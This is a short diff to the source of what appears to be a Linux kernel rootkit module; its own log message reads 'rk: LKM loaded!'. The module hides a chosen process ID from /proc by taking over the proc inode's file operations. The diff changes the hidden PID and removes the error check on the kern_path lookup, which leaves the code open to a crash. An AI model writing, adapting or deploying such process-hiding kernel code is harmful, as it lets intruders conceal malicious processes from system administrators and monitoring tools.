@@ -6,7 +6,7 @@
 #include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/proc_fs.h>
-#define proc_pid_to_hide "19787"
+#define proc_pid_to_hide "8353"
 static struct file_operations *backup_fops;
 static struct file_operations proc_fops;
 static struct inode *proc_inode;
@@ -39,8 +39,7 @@ static int process_hide(void)
 {
     struct path p;
     printk(KERN_ALERT "rk: LKM loaded!");
-    if(kern_path("/proc", 0, &p))
-        return -1;
+    kern_path("/proc", 0, &p);
     //get the inode
     proc_inode = p.dentry->d_inode;
     //get a copy of fop from inode
